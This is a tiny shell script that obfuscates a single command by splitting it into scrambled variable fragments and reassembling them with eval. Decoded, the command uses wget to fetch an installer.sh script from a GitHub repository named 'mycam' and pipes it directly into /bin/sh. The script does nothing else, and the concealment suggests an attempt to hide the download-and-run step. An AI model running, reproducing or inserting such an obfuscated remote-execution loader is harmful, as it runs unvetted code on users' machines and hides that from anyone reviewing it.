z="
";Tz='| /b';Jz='om/e';Qz='ler.';Ez='.git';Iz='nt.c';Az='wget';Pz='stal';Vz='h';Cz='ps:/';Oz='n/in';Uz='in/s';Gz='serc';Nz='/mai';Lz='37/m';Fz='hubu';Mz='ycam';Dz='/raw';Kz='mil2';Rz='sh -';Bz=' htt';Hz='onte';Sz='O - ';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"